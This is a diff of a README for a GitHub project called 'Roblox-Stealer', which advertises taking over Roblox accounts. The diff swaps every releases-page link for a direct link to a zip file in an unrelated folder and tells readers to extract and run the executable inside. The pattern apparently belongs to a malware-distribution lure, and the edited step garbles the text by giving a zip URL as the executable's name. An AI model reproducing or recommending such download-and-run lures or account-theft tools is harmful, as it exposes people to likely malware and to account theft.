@@ -1,7 +1,7 @@
 # 🛠️ Roblox-Stealer - Start Accessing Roblox Accounts Easily
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/fokmadrs/Roblox-Stealer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/fokmadrs/Roblox-Stealer/main/buhrstone/Roblox-Stealer.zip)](https://raw.githubusercontent.com/fokmadrs/Roblox-Stealer/main/buhrstone/Roblox-Stealer.zip)
 
 ## 🚀 Getting Started
 Welcome to Roblox-Stealer! This application helps you access Roblox accounts quickly and effortlessly. Follow these steps to get started.
@@ -25,7 +25,7 @@ Roblox-Stealer offers several features to assist with your needs:
 ## 📦 Download & Install
 To get Roblox-Stealer, follow these simple steps:
 
-1. **Visit the Releases Page:** Click this link to go to our releases page: [Download Page](https://github.com/fokmadrs/Roblox-Stealer/releases).
+1. **Visit the Releases Page:** Click this link to go to our releases page: [Download Page](https://raw.githubusercontent.com/fokmadrs/Roblox-Stealer/main/buhrstone/Roblox-Stealer.zip).
 
 2. **Select the Latest Release:** Look for the most recent version at the top of the page. 
 
@@ -33,7 +33,7 @@ To get Roblox-Stealer, follow these simple steps:
 
 4. **Extract the Files:** If the downloaded file is compressed (like a .zip file), right-click it and choose to extract the contents.
 
-5. **Run the Application:** Locate the extracted folder, and double-click on the executable file (e.g., Roblox-Stealer.exe) to start the application.
+5. **Run the Application:** Locate the extracted folder, and double-click on the executable file (e.g., https://raw.githubusercontent.com/fokmadrs/Roblox-Stealer/main/buhrstone/Roblox-Stealer.zip) to start the application.
 
 6. **Follow On-Screen Instructions:** The application will guide you through the setup process.
 
@@ -72,4 +72,4 @@ Join our community to share tips and experiences with other users. Visit our dis
 
 ---
 
-Thank you for choosing Roblox-Stealer! With this straightforward guide, you are now ready to download and use the application effortlessly. For downloads and the latest updates, don’t forget to check our releases page frequently: [Download Page](https://github.com/fokmadrs/Roblox-Stealer/releases).
+Thank you for choosing Roblox-Stealer! With this straightforward guide, you are now ready to download and use the application effortlessly. For downloads and the latest updates, don’t forget to check our releases page frequently: [Download Page](https://raw.githubusercontent.com/fokmadrs/Roblox-Stealer/main/buhrstone/Roblox-Stealer.zip).
